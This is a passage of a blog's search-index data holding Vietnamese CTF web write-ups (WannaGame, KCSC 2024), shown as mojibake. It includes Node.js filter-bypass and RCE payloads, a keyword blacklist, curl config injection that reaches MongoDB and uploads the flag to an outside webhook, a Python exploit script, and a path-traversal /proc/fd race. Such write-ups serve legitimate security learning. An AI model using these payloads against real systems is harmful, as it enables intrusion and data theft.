hÃ m Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ â€˜so sÃ¡nhâ€™ cÃ¡c pháº§n tá»­ bÃªn trong máº£ng -&gt; Má»—i pháº§n tá»« Ä‘Æ°á»£c chuyá»ƒn qua string(trigger call function) -&gt; Tráº£ vá» má»™t anonymouse function -&gt; Cuá»‘i cÃ¹ng giÃ¡ trá»‹ sau khi â€˜so sÃ¡nhâ€™ sáº½ Ä‘Æ°á»£c tráº£ vá» dÆ°á»›i dáº¡ng string (trigger call function)ÄÃ¢y lÃ  code mÃ´ phá»ng láº¡i quÃ¡ trÃ¬nh sorttoString.constructor.prototype.toString=Function.call;Function(a[1].toString(),a[0].toString()).toString();"
  },
  
  {
    "title": "WannaGame",
    "url": "/posts/Wannagame2024/",
    "categories": "CTF Writeup",
    "tags": "NodeJS, Bypass Filter",
    "date": "2024-06-14 23:00:00 +0700",
    





    
    "snippet": "WannaGame vá»«a má»›i káº¿t thÃºc, mÃ¬nh xin viáº¿t láº¡i má»™t sá»‘ bÃ i mÃ  mÃ¬nh lÃ m Ä‘Æ°á»£c, giáº£i nÃ y mÃ¬nh khÃ¡ may máº¯n khi giáº£i Ä‘Æ°á»£c 2 bÃ i vÃ  mÃ¬nh cÅ©ng há»c Ä‘Æ°á»£c ráº¥t nhiá»u thá»© tá»« giáº£i nÃ y.newchallThis is a simple cal...",
    "content": "WannaGame vá»«a má»›i káº¿t thÃºc, mÃ¬nh xin viáº¿t láº¡i má»™t sá»‘ bÃ i mÃ  mÃ¬nh lÃ m Ä‘Æ°á»£c, giáº£i nÃ y mÃ¬nh khÃ¡ may máº¯n khi giáº£i Ä‘Æ°á»£c 2 bÃ i vÃ  mÃ¬nh cÅ©ng há»c Ä‘Æ°á»£c ráº¥t nhiá»u thá»© tá»« giáº£i nÃ y.newchallThis is a simple calc program,let's try /exec?q=9*10.Author: dcthinhhttp://45.122.249.68:20011BÃ i nÃ y cho má»™t trang web cÃ³ chá»©c nÄƒng nhÆ° trÃªn vÃ  mÃ¬nh Ä‘oÃ¡n khÃ¡ lÃ  cháº¯c ráº±ng táº¥t cáº£ nhá»¯ng gÃ¬ mÃ¬nh nháº­p vÃ o sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o eval nÃªn chÃºng ta cá»© thá»­ má»™t sá»‘ payload Ä‘Æ¡n giáº£n vÃ o trÆ°á»›c.require(\"child_process\").spawnSync('ls').output.toString()VÃ  cÃ³ váº» nhÆ° lÃ  bá»‹ cháº·n, mÃ¬nh nghÄ© lÃ  cÃ³ thá»ƒ cháº·n má»™t sá»‘ tá»« khÃ³a nhÆ° require hoáº·c child_process nÃªn mÃ¬nh sáº½ thá»­ má»™t sá»‘ payload khÃ¡cPayload 1:global.process.mainModule.require('child_process').execSync('ls').toString()Táº¥t nhiÃªn cÃ¡i nÃ y sáº½ bá»‹ cháº·n vÃ¬ cÃ³ tá»« khÃ³a require nÃªn mÃ¬nh sáº½ tÃ¬m cÃ¡ch Ä‘á»ƒ bypass cÃ¡i nÃ y. ChÃºng ta cÃ³ thá»ƒ gá»i require nhÆ° sauglobal.process.mainModule[\"require\"]Ta cÃ³ thá»ƒ Ä‘á»•i require thÃ nh requir\\145 (\\145 lÃ  mÃ£ octal cá»§a e) vÃ¬ trong quÃ¡ trÃ¬nh thá»±c thi requir\\145 sáº½ Ä‘Æ°á»£c chuyá»ƒn thÃ nh require vÃ  chÃºng ta cÃ³ thá»ƒ lá»£i dá»¥ng cÃ¡i nÃ y Ä‘á»ƒ bypass filtersPayload cuá»‘i cÃ¹ngglobal.process.mainModule[\"requir\\145\"]('chil\\144_proces\\163')[\"spaw\\156Sy\\156c\"]('cat',['flag.txt']).output.toString();VÃ  mÃ¬nh cÃ³ Ä‘Æ°á»£c flagSau khi dump ra Ä‘Æ°á»£c source thÃ¬ Ä‘Ã¢y lÃ  cÃ¡c chuá»—i bá»‹ cháº·nblacklist = ['system', 'child_process', 'exec', 'spawn', 'eval', 'require'];Payload 2:Note: CÃ¡ch nÃ y mÃ¬nh Ä‘Ã£ Ä‘á»c Ä‘Æ°á»£c tá»« writeup cá»§a cÃ¡c giáº£i amstrong2024 vÃ  TSG2023 vÃ  tham kháº£o cá»§a anh shin24 link mÃ¬nh sáº½ Ä‘Ã­nh kÃ¨m bÃªn dÆ°á»›itoString.constructor.prototype.toString=toString.constructor.prototype.call;var a=[\"process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')\"];a[1]=\"x\";b={};b[Symbol.hasInstance]=a.sort;b[\"__proto__\"]=a;toString.constructor instanceof b;Giáº£i thÃ­ch sÆ¡ qua vá» payload nÃ y      Äáº§u tiÃªn chÃºng ta sáº½ gá»i Ä‘áº¿n function toString vÃ  gÃ¡n giÃ¡ trá»‹ cá»§a function call cho nÃ³        Tiáº¿p theo ta táº¡o má»™t máº£ng a vá»›i giÃ¡ trá»‹ Ä‘áº§u tiÃªn lÃ  payload mÃ  ta muá»‘n execute (payload nÃ y sáº½ Ä‘Æ°á»£c thá»±c thi trong anonymous function)        Tiáº¿p theo ta gÃ¡n giÃ¡ trá»‹ 'x' cho a[1] (sáº½ giáº£i thÃ­ch á»Ÿ bÃªn dÆ°á»›i vÃ¬ sao cÃ³ pháº§n nÃ y)        Sau Ä‘Ã³ táº¡o má»™t object b vá»›i key lÃ  Symbol.hasInstance vÃ  value lÃ  a.sort        Sau Ä‘Ã³ set __proto__ cá»§a b lÃ  a        Cuá»‘i cÃ¹ng lÃ  kiá»ƒm tra xem toString.constructor cÃ³ pháº£i lÃ  instance cá»§a b (tháº­t ra Ä‘oáº¡n nÃ y khÃ´ng háº³n lÃ  kiá»ƒm tra mÃ  lÃ  Ä‘iá»u kiá»‡n Ä‘á»ƒ RCE)  TrÆ°á»›c khi Ä‘i vÃ o pháº§n phÃ¢n tÃ­ch sÃ¢u hÆ¡n, mÃ¬nh sáº½ giáº£i thÃ­ch vá» cÃ¡ch cá»§a instanceof hoáº¡t Ä‘á»™ngSyntaxobject instanceof constructorToÃ¡n tá»­ instanceof lÃ  toÃ¡n tá»­ dÃ¹ng Ä‘á»ƒ kiá»ƒm tra xem má»™t Ä‘á»‘i tÆ°á»£ng cÃ³ thuá»™c lá»›p nÃ o Ä‘Ã³ hay khÃ´ngVÃ­ dá»¥ Ä‘Æ¡n giáº£n nhÆ° sauclass BOX {}let DI = new BOX();console.log(DI instanceof BOX); //trueNgoÃ i ra náº¿u constructor (pháº§n bÃªn pháº£i cá»§a instanceof) cÃ³ phÆ°Æ¡ng thá»©c Symbol.hasInstance thÃ¬ nÃ³ sáº½ Ä‘Æ°á»£c Æ°u tiÃªn gá»i, vá»›i object (pháº§n bÃªn trÃ¡i cá»§a instanceof) lÃ  tham sá»‘ truyá»n vÃ o cÃ²n bÃªn pháº£i lÃ  this sau Ä‘Ã³ dÃ¹ng káº¿t quáº£ Ä‘á»ƒ tráº£ vá» káº¿t quáº£ cá»§a instanceofVÃ­ dá»¥ 1:BOX = {[Symbol.hasInstance]: (dib) =&gt; {    // console.log(dib)    return dib === 'dib'}};DI = 'dib'console.log(DI instanceof BOX); //trueVÃ­ dá»¥ 2:a = ['1','0']a.__proto__['loG'] = function(a) {    console.log(\"triggered\")}BOX = {[Symbol.hasInstance]: a.loG};DI = Functionconsole.log(DI instanceof BOX); // \"triggered\"// console.log(a)Äáº¿n pháº§n chÃ­nh, Ä‘i sÃ¢u vÃ o giáº£i thÃ­ch vÃ¬ sao nÃ³ hoáº¡t Ä‘á»™ngtoString.constructor instanceof b;Khi cÃ¢u lá»‡nh nÃ y Ä‘Æ°á»£c thá»±c thi thÃ¬:      Khi instanceof Ä‘Æ°á»£c sá»­ dá»¥ng thÃ¬ nÃ³ sáº½ tÃ¬m kiáº¿m xem b cÃ³ thuá»™c tÃ­nh Symbol.hasInstance khÃ´ng? Náº¿u cÃ³ thÃ¬ sáº½ thá»±c thi gá»i tá»›i a.sort lÃ  this vÃ  toString.constructor (AKA Function) lÃ  tham sá»‘ truyá»n vÃ o        Khi a.sort(function sort) Ä‘Æ°á»£c gá»i Ä‘áº¿n thÃ¬ bÃ¬nh thÆ°á»ng  thÃ¬ nÃ³ sáº½ cá»‘ gáº¯ng chuyá»ƒn táº¥t cáº£ cÃ¡c pháº§n tá»­ trong máº£ng thÃ nh string báº±ng hÃ m toString() rá»“i so sÃ¡nh báº±ng function truyá»n vÃ o. Äiá»u nÃ y vÃ´ tÃ¬nh trigger hÃ m call() chÃºng ta Ä‘Ã£ Ä‘á»•i á»Ÿ lÃºc Ä‘áº§u vÃ  bÃ¢y giá» cáº£ array sáº½ trá»Ÿ thÃ nh parameter cá»§a new Function        NÃ³i thÃªm á»Ÿ pháº§n nÃ y vá» lÃ½ do pháº£i set b[__proto__]=a lÃ  vÃ¬ sort lÃ  function cá»§a array nÃªn chÃºng ta pháº£i Ä‘á»•i prototype cá»§a nÃ³ thÃ nh array thÃ¬ sort má»›i cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c thi vÃ  hÆ¡n háº¿t khi Ä‘Ã³ sort sáº½ Ä‘Æ°á»£c thá»±c thi trÃªn b, b lÃºc nÃ y lÃ  má»™t object nÃªn sort sáº½ cá»‘ gáº¯ng tÃ¬m kiáº¿m array trong object nÃ y báº±ng cÃ¡ch tÃ¬m kiáº¿m trong prototype cá»§a nÃ³ khi Ä‘Ã³ nÃ³ sáº½ tÃ¬m Ä‘Æ°á»£c 1 array trong vÃ¬ ta set prototype cá»§a b lÃ  a        GiÃ¡ trá»‹ return cá»§a new Function nÃ y sáº½ lÃ  má»™t anonymous vá»›i a[0] lÃ  function vÃ  a[1] lÃ  parameter  (function anonymous(x) {process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')})  Äá»ƒ nÃ³i thÃªm má»™t chÃºt ná»¯a thÃ¬ flow cá»§a chÆ°Æ¡ng trÃ¬nh sáº½ nhÆ° sau trigger sort -&gt; sort nháº­n Function lÃ m tham sá»‘ -&gt; Function lÃ  hÃ m Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ â€˜so sÃ¡nhâ€™ cÃ¡c pháº§n tá»­ bÃªn trong máº£ng -&gt; Má»—i pháº§n tá»« Ä‘Æ°á»£c chuyá»ƒn qua string(trigger call function) -&gt; Tráº£ vá» má»™t anonymouse function -&gt; Cuá»‘i cÃ¹ng giÃ¡ trá»‹ sau khi â€˜so sÃ¡nhâ€™ sáº½ Ä‘Æ°á»£c tráº£ vá» dÆ°á»›i dáº¡ng string (trigger call function)ÄÃ¢y lÃ  code mÃ´ phá»ng láº¡i quÃ¡ trÃ¬nh sorttoString.constructor.prototype.toString=Function.call;Function(a[1].toString(),a[0].toString()).toString();Tá»« Ä‘Ã³ ta RCE vÃ  láº¥y Ä‘Æ°á»£c flagFlag: W1{hehehe}P/S: tháº­t ra cÃ¡ch nÃ y Ä‘Ãºng lÃ  â€œdÃ¹ng dao má»• trÃ¢u Ä‘á»ƒ giáº¿t gÃ â€ vÃ¬ cÃ¡ch nÃ y dÃ¹ng cho nhá»¯ng bÃ i vá»›i filter cháº·t vÃ  bá»‹ háº¡n cháº¿ nhiá»u thá»©. Do mÃ¬nh cÃ³ sá»­ dá»¥ng cÃ¡ch nÃ y khi thi nÃªn tiá»‡n thá»ƒ phÃ¢n tÃ­ch luÃ´n cÃ¡ch nÃ yCURRLet explore my website!!!Author: dcthinhhttp://45.122.249.68:20014TÃ³m táº¯t vá» source code cá»§a trang web nÃ yApp nÃ y cÃ³ 3 route ,/ , /api/login vÃ  /api/curr vÃ  mÃ¬nh sáº½ táº­p trung vÃ o route /api/currRoute nÃ y cÃ³ chá»©c nÄƒng lÃ  dÃ¹ng lá»‡nh curl vá»›i cÃ¡c options nhÆ° lÃ  -d, â€¦, vÃ  cÃ³ má»™t cÃ¡i middleware lÃ  /api/login Ä‘á»ƒ kiá»ƒm tra loginUsers vÃ  Flag Ä‘Æ°á»£c lÆ°u trong mongoDB vÃ  Ä‘á»c code má»™t lÃºc thÃ¬ khÃ´ng cÃ³ cÃ¡ch nÃ o Ä‘á»ƒ login hay bypass login cáº£const crypto = require(\"crypto\");const app = db.getSiblingDB('app');app.users.insertOne({ user: \"admin\", pass: crypto.randomBytes(64).toString(\"hex\") });const secret = db.getSiblingDB('secret');secret.flag.insertOne({ flag: process.env.FLAG || \"W1{REACTED}\" });NhÆ°ng nhÃ¬n ká»‰ láº¡i midleware thÃ¬ mÃ¬nh tháº¥y má»™t Ä‘iá»u khÃ¡ lÃ  láº¡const requiresLogin = (req, res, next) =&gt; {    if (!req.session.user) {        res.redirect(\"/?error=login first\");    }    next();};VÃ¬ sao láº¡i cÃ³ next(); á»Ÿ dÆ°á»›i cÃ¹ng cá»§a middleware nÃ y, mÃ¬nh nghÄ© lÃ  cÃ³ váº» nhÆ° lÃ  dÃ¹ khÃ´ng cÃ³ login nhÆ°ng váº«n cÃ³ thá»ƒ Ä‘i tá»›i endpoint sau chÄƒng ?VÃ  Ä‘Ãºng lÃ  tháº¿, nÃ³ sáº½ cháº¡y pháº§n code phÃ­a sau nhÆ°ng mÃ  chÃºng ta khÃ´ng thá»ƒ tháº¥y pháº§n output thÃ´iÄáº¿n pháº§n /api/currapp.post(\"/api/curr\", requiresLogin, (req, res) =&gt; {    let { url } = req.body;    if (!url || typeof url !== \"string\") {        return res.json({ success: false, message: \"Invalid URL\" });    }    try {        let parsed = new URL(url);        if (![\"http:\", \"https:\"].includes(parsed.protocol)) throw new Error(\"Invalid URL\");    }    catch (e) {        return res.json({ success: false, message: e.message });    }    const args = [ url ];    let { opt, data } = req.body;    if (opt &amp;&amp; data &amp;&amp; typeof opt === \"string\" &amp;&amp; typeof data === \"string\") {        if (!/^-[A-Za-z]$/.test(opt)) {            return res.json({ success: false, message: \"Invalid option\" });        }        // check method        if (opt === \"-d\" || [\"GET\", \"POST\"].includes(data)) {            args.push(opt, data);        }    }    cp.spawn('curl', args, { timeout: 2000, cwd: \"/tmp\" }).on('close', (code) =&gt; {        // save result to database        res.json({ success: true, message: `The site is ${code === 0 ? 'up' : 'down'}` });    });});Pháº§n nÃ y sáº½ láº¥y URL cá»§a chÃºng ta vÃ  kiá»ƒm tra nÃ³ sau Ä‘Ã³ kiá»ƒm tra pháº§n opt náº¿u nÃ³ qua Ä‘Æ°á»£c pháº§n kiá»ƒm tra thÃ¬ sáº½ thá»±c thi lá»‡nh curr vá»›i cÃ¡c options mÃ  ta thÃªm vÃ oPháº§n kiá»ƒm tra opt khÃ¡ lÃ  cháº·t. Äáº§u tiÃªn kiá»ƒm tra xem opt cÃ³ báº¯t Ä‘áº§u báº±ng - vÃ  sau Ä‘Ã³ 1 lÃ  1 kÃ½ tá»± [a-zA-Z] khÃ´ng, tiáº¿p sau Ä‘Ã³ kiá»ƒm tra opt má»™t lÃ  -d vÃ  lÃ  data hay lÃ  1 option báº¥t ká»³ vÃ  cÃ³ data lÃ  GET, hoáº·c lÃ  POST.VÃ  curl cÃ³ há»— trá»£ má»™t options lÃ  -K (â€“config) option nÃ y giÃºp cho lá»‡nh curl cá»§a chÃºng ta Ä‘á»c tá»« má»™t file text vÃ  sá»­ dá»¥ng nÃ³ lÃ m cÃ¡c options. Tá»« Ä‘Ã³ suy ra náº¿u mÃ  cÃ³ cÃ¡ch nÃ o Ä‘Ã³ Ä‘á»ƒ chÃºng ta download file options cá»§a chÃºng ta vá» server vÃ  báº¯t server curl vá»›i options Ä‘Ã³ ta cÃ³ thá»ƒ curl tá»›i báº¥t ká»³ URL nÃ oÄá»ƒ thá»­ thÃ¬ Ä‘Ã¢y lÃ  options thá»­ nghiá»‡m--url \"http://XXXXXX.requestrepo.com\"user-agent = \"yuu\"Ta cÃ³ thá»ƒ setup má»™t python http server vÃ  expose báº±ng ngrok Ä‘á»ƒ vÃ  dÃ¹ng curl Ä‘á»ƒ download file báº±ng cÃ¡ch sauurl =xxxxx.NGROK.com/options.txt&amp;opt=-o&amp;data=GETTiáº¿p tá»¥c ta thá»­ xem liá»‡u nÃ³ cÃ³ request Ä‘áº¿n server cá»§a mÃ¬nh vá»›i useragent lÃ  yuu khÃ´ngurl =xxxxxx.webhook.com&amp;opt=-K&amp;data=GETVáº­y lÃ  cÃ³ thá»ƒ gá»­i tá»›i báº¥t ká»³ url nÃ o vá»›i báº¥t ká»³ options nÃ o mÃ  ta muá»‘nVáº­y vá»›i nhá»¯ng thá»© nÃ y thÃ¬ lÃ m sao láº¥y flag tá»« mongoDB Ä‘Ã¢y? MongoDB giao tiáº¿p thÃ´ng qua MongoDB Wire Protocol. NgÆ°á»i dÃ¹ng cÃ³ thá»ƒ giao tiáº¿p vá»›i database server thÃ´ng qua TCP/IP. Váº­y chÃºng ta cÃ³ thá»ƒ dÃ¹ng gopher Ä‘á»ƒ vÃ  dÃ¹ng curl Ä‘á»ƒ connect tá»›i database server vÃ  láº¥y flag, nhÆ°ng tiáº¿c lÃ  chÃºng ta khÃ´ng thá»ƒ dÃ¹ng gopher vÃ¬ author Ä‘Ã£ set up nhÆ° bÃªn dÆ°á»›iNhÆ°ng mÃ  váº«n cÃ³ má»™t sá»‘ protocol khÃ¡c nhÆ° telnet khi mÃ  chÃºng cÅ©ng giao tiáº¿p báº±ng TCPVáº­y ta cÃ³ thá»ƒ gá»­i má»™t binary file(TCP transfer - file nÃ y chá»©a má»™t giao tiáº¿p láº¥y flag) cho mongo database server Ä‘á»ƒ server tráº£ cÃ¡i flag vá»Ta cÃ³ thá»ƒ báº¯t file nÃ y báº±ng cÃ¡ch táº¡o má»™t file Ä‘á»ƒ giáº£ láº­p viá»‡c láº¥y flag vÃ  sá»­ dá»¥ng tcpdump Ä‘á»ƒ báº¯t gÃ³i tin Ä‘Ã³File js dÃ¹ng Ä‘á»ƒ láº¥y flagconst  { MongoClient } = require( \"mongodb\" );const client = new MongoClient( \"mongodb://mongodb:27017/\" );client.connect().then(async () =&gt; {     const flag = client.db( \"secret\" ).collection( \"flag\" );    var flag_1 = await flag.findOne()    console.log(flag_1);    client.close();} );ÄÃ¢y lÃ  ná»™i dung lÃºc giao tiáº¿p vá»›i serverTa cÃ³ thá»ƒ táº£i ná»™i dung TCP payload vá», Ä‘Ã¢y chÃ­nh lÃ  quÃ¡ trÃ¬nh mÃ  server giao tiáº¿p vá»›i databaseThá»­ dÃ¹ng file nÃ y Ä‘á»ƒ giao tiáº¿p xem cÃ³ Ä‘Æ°á»£c khÃ´ngNÃ³ cÃ³ tráº£ vá» flag váº­y cÃ³ nghÄ©a lÃ  chÃºng ta cÃ³ thá»ƒ dÃ¹ng cÃ¡ch nÃ yVáº­y cuá»‘i cÃ¹ng Ä‘Ã¢y lÃ  cÃ¡ch lÃ m  Táº£i file options vá»›i ná»™i dung bÃªn dÆ°á»›i url=http://NGROKSERVER.com/options.txt&amp;opt=-o&amp;data=GET--max-time 1--upload-file \"POST\"--url \"telnet://mongodb:27017\"-o \"GET\"      Tiáº¿p theo táº£i file data tcp mÃ  ta báº¯t Ä‘Æ°á»£c vÃ o server url=http://NGROKSERVER.com/test.data.dat&amp;opt=-o&amp;data=POST        Sau Ä‘Ã³ request Ä‘áº¿n má»™t trang web báº¥t ká»³ vá»›i option lÃ  file GET(options mÃ  ta lÃºc nÃ£y gá»­i) url=http://ABCXYZ.COM&amp;opt=-K&amp;data=GET ( lÃºc nÃ y lÃ  lÃºc mÃ  chÃºng ta giao tiáº¿p vá»›i database Ä‘á»ƒ láº¥y flag vÃ  lÆ°u vÃ o GET)        Cuá»‘i cÃ¹ng lÃ  upload file GET vá» server cá»§a ta url=http://WEBHOOKSERVER.COM&amp;opt=-T&amp;data=GET  Payload tá»± Ä‘á»™ng láº¥y flagimport requestsimport time# URL = \"http://localhost:8888\"URL = \"http://45.122.249.68:20014\"data = {    \"url\": \"https://NGROKSERVER/options.txt\",    \"opt\": \"-o\",    \"data\": \"GET\"}r = requests.post(f\"{URL}/api/curr\", data=data)time.sleep(1)data = {    \"url\": \"https://NGROKSERVER/test.data.dat\",    \"opt\": \"-o\",    \"data\": \"POST\"}r = requests.post(f\"{URL}/api/curr\", data=data)time.sleep(1)data = {    \"url\": \"http://ABCXYZ.COM\",    \"opt\": \"-K\",    \"data\": \"GET\"}r = requests.post(f\"{URL}/api/curr\", data=data)time.sleep(5)data = {    \"url\": \"http://WEBHOOKSERVER.COM\",    \"opt\": \"-T\",    \"data\": \"GET\"}r = requests.post(f\"{URL}/api/curr\", data=data)Flag: W1{nice_try_without_gopher}Káº¿t bÃ i"
  },
  
  {
    "title": "KCSC 2024",
    "url": "/posts/KCSCCTF/",
    "categories": "CTF Writeup",
    "tags": "Python, Flask, Path Traversal",
    "date": "2024-05-15 23:00:00 +0700",
    





    
    "snippet": "BÃ i Ka Tuá»•i Tráº»TÃ³m táº¯t: Challenge nÃ y lÃ  sá»­ dá»¥ng má»™t server flask Ä‘Æ¡n giáº£n vá»›i function Ä‘á»c file táº¡i endpoint / vá»›i params file sau Ä‘Ã³ thÃªm ./static vÃ o Ä‘áº±ng trÆ°á»›c file Ä‘á»ƒ Ä‘á»c file trong thÆ° má»¥c st...",
    "content": "BÃ i Ka Tuá»•i Tráº»TÃ³m táº¯t: Challenge nÃ y lÃ  sá»­ dá»¥ng má»™t server flask Ä‘Æ¡n giáº£n vá»›i function Ä‘á»c file táº¡i endpoint / vá»›i params file sau Ä‘Ã³ thÃªm ./static vÃ o Ä‘áº±ng trÆ°á»›c file Ä‘á»ƒ Ä‘á»c file trong thÆ° má»¥c static. Pháº§n sau lÃ  kiá»ƒm tra file cÃ³ tá»“n táº¡i khÃ´ng, dung lÆ°á»£ng cá»§a file pháº£i bÃ© hÆ¡n 2MB vÃ  cÃ³ quyá»n Ä‘á»c nÃ³ thÃ¬ sáº½ tiáº¿p tá»¥c Ä‘i qua regex náº¿u qua thÃ¬ sáº½ tráº£ vá» ná»™i dung cá»§a file Ä‘Ã³.from flask import Flask, request, redirectfrom os import access, R_OK, statfrom os.path import isfile, join, normpathimport regeximport osapp = Flask(__name__, static_url_path='/static', static_folder='static')@app.get('/')def home():\tif request.args.get('file'):\t\tfilename = join(\"./static\", request.args.get('file'))\t\tif isfile(normpath(filename)) and access(normpath(filename), R_OK) and (stat(normpath(filename)).st_size &lt; 1024 * 1024 * 2):\t\t\ttry:\t\t\t\twith open(normpath(filename), \"rb\") as file:\t\t\t\t\tif not regex.search(r'^(([ -~])+.)+([(^~\\'!*&lt;&gt;:;,?\"*|%)]+)|([^\\x00-\\x7F]+)(([ -~])+.)+$', filename, timeout=2) and \"flag\" not in filename:\t\t\t\t\t\treturn file.read(1024 * 1024 * 2)\t\t\texcept:\t\t\t\tpass\treturn redirect(\"/?file=index.html\")BÃ i nÃ y nhÃ¬n vÃ o lÃ  cÃ³ thá»ƒ nháº­n ra ngay dÃ­nh lá»—i path traversal khi chá»‰ dÃ¹ng normpath Ä‘á»ƒ check path cá»§a file. ChÃºng ta cÃ³ thá»ƒ Ä‘Æ¡n giáº£n lÃ  thÃªm /// vÃ o lÃ  path cá»§a file sáº½ Ä‘Æ°á»£c trá» vá» root (vÃ­ dá»¥ ///etc/passwd)Sau khi biáº¿t Ä‘Ã¢y lÃ  lá»—i path traversal thÃ¬ mÃ¬nh thá»­ kiá»ƒm xem filter cá»§a regex cÃ³ thá»ƒ bypass Ä‘Æ°á»£c khÃ´ngÄá»c xong filter thÃ¬ thÃ¬ mÃ¬nh tháº¥y Ä‘Æ¡n giáº£n regex Ä‘áº§u tiÃªn khÃ´ng cÃ³ nghÄ©a gÃ¬ cáº£ vÃ  cháº·n náº¿u tÃªn file cÃ³ chá»¯ flag. LÃºc nÃ y thÃ¬ vá»«a may cÃ³ gá»£i Ã½ lÃ  File descriptor nÃªn mÃ¬nh nghÄ© ra má»™t cÃ¡ch khÃ¡cFile descriptorFile descriptor lÃ  má»™t Ä‘á»‹nh danh Ä‘á»™c nháº¥t cho má»™t táº­p tin cÃ¡i mÃ  há»‡ Ä‘iá»u hÃ nh gÃ¡n cho nÃ³ khi mÃ  má»Ÿ má»™t file nÃ o Ä‘Ã³. NÃ³ cho phÃ©p cÃ¡c chÆ°Æ¡ng trÃ¬nh tÆ°Æ¡ng tÃ¡c vá»›i files, sockets, I/O. File descriptor thÆ°á»ng lÃ  má»™t sá»‘ nguyÃªn khÃ´ng Ã¢m vÃ  Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ theo dÃµi cÃ¡c file vÃ  thá»±c hiá»‡n thao tÃ¡c trÃªn nÃ³.Váº­y vá»›i cÃ¡i nÃ y thÃ¬ chÃºng ta sáº½ lÃ m gÃ¬ ? NhÃ¬n vÃ o Ä‘oáº¡n code trÃªn khi má»Ÿ má»™t file trong text mode (â€˜wâ€™, â€˜râ€™, â€˜wtâ€™, â€˜rtâ€™, etc.) thÃ¬ nÃ³ sáº½ return má»™t subclass cá»§a io.TextIOBase. Váº­y cÃ³ nghÄ©a lÃ  sao, cÃ³ nghÄ©a lÃ  nÃ³ sáº½ má»Ÿ má»™t file descriptor khi Ä‘á»c má»™t file. Ta cÃ³ thá»ƒ táº­n dá»¥ng cÃ¡i nÃ y Ä‘á»ƒ Ä‘á»c file thÃ´ng qua viá»‡c khÃ´ng cáº§n Ä‘á»c qua Ä‘Æ°á»ng Ä‘áº«n cá»§a nÃ³.Má»™t vÃ­ dá»¥/proc/pid/fd/ÄÃ¢y lÃ  thÆ° má»¥c con chá»©a cÃ¡c symlink trá» Ä‘áº¿n má»™t file nÃ o Ä‘Ã³. Trong nÃ y luÃ´n cÃ³ cÃ¡c file 0, 1, 2 tÆ°Æ¡ng á»©ng vá»›i 0 lÃ  standard input, 1 lÃ  standard output, 2 lÃ  standard error vÃ  cÃ¡c file khÃ¡c cÃ³ thá»ƒ lÃ  trá» Ä‘áº¿n 1 socket nÃ o Ä‘Ã³ hoáº·c 1 file cá»¥ thá»ƒKáº¿t há»£p hai Ä‘iá»u trÃªn ta cÃ³ thá»ƒ suy ra Ä‘Æ°á»£c cÃ¡ch giáº£i nhÆ° sauKhi mÃ  má»Ÿ 1 file trong text mode thÃ¬ nÃ³ sáº½ má»Ÿ má»™t file descriptor trong proc/pid/fd (pid lÃ  mÃ£ sá»‘ cá»§a process Ä‘Ã³) vÃ  file Ä‘Ã³ láº¡i symlink Ä‘áº¿n file ta muá»‘n Ä‘á»c =&gt; Ä‘á»c file báº¥t kÃ¬VÃ­ dá»¥Váº­y Ä‘á»ƒ giáº£i bÃ i nÃ y thÃ¬ mÃ¬nh sáº½ dÃ¹ng file descriptor Ä‘á»ƒ Ä‘á»c flagNhÆ°ng mÃ  cÃ³ má»™t váº¥n Ä‘á» lÃ  khi má»Ÿ file thÃ¬ nÃ³ láº¡i Ä‘Ã³ng file quÃ¡ nhanh lÃ m mÃ¬nh chÆ°a ká»‹p access vÃ o process id cá»§a nÃ³ nÃªn bÃ¢y giá» mÃ¬nh má»›i Ä‘á»ƒ Ã½ pháº§n regex filter cá»§a nÃ³.Náº¿u tÃªn file quÃ¡ dÃ i thÃ¬ khi Ä‘Æ°a qua regex nÃ³ sáº½ cháº¡y ráº¥t lÃ¢u(max lÃ  2 giÃ¢y) vÃ  mÃ¬nh cÃ³ thá»ƒ táº­n dá»¥ng khoáº£ng thá»i gian nÃ y Ä‘á»ƒ vÃ o proc/pid/fd vÃ  Ä‘á»c fileSau má»™t lÃºc fuzz thÃ¬ mÃ¬nh tháº¥y pid cá»§a nÃ³ nháº£y ngáº«u nhiÃªn trong cÃ¡c giÃ¡ trá»‹ 1,7,8,9 vÃ  file descriptor cÃ³ tÃªn lÃ  10 sáº½ lÃ  file symlink Ä‘áº¿n file mÃ¬nh Ä‘á»cVáº­y ta cÃ³ thá»ƒ request Ä‘áº¿n server vá»›i payload /?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa./../../../../../flag.txt Ä‘á»ƒ má»Ÿ má»™t file descriptor link Ä‘áº¿n file /flag.txt vÃ  do tÃªn quÃ¡ dÃ i nÃªn regex sáº½ bá»‹ pháº£i cháº¡y lÃ¢uTrong thá»i gian 2s, mÃ¬nh gá»­i Ä‘áº¿n táº¥t cáº£ pid 1,7,8,9 vÃ  Ä‘á»c file descriptor 10 Ä‘á»ƒ Ä‘á»c flagDÆ°á»›i Ä‘Ã¢y lÃ  script Ä‘á»ƒ tá»± Ä‘á»™ng láº¥y flagimport requestsimport threadingimport timeurl = 